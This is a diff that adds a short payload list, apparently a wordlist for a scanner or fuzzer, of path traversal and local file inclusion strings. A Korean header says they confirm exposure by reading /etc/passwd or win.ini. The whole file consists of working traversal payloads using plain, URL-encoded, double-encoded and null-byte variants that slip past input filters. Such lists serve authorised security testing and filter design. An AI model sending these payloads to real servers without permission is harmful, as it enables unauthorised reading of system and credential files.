@@ -1,0 +1,15 @@
+# Path Traversal / LFI - 시스템 파일 노출로 확인 (Unix passwd / Windows win.ini)
+# --- Unix /etc/passwd ---
+/etc/passwd
+../../../../etc/passwd
+../../../../../../../../etc/passwd
+....//....//....//....//etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+../../../../etc/passwd%00
+# --- Windows win.ini ---
+C:\windows\win.ini
+..\..\..\..\windows\win.ini
+../../../../windows/win.ini
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
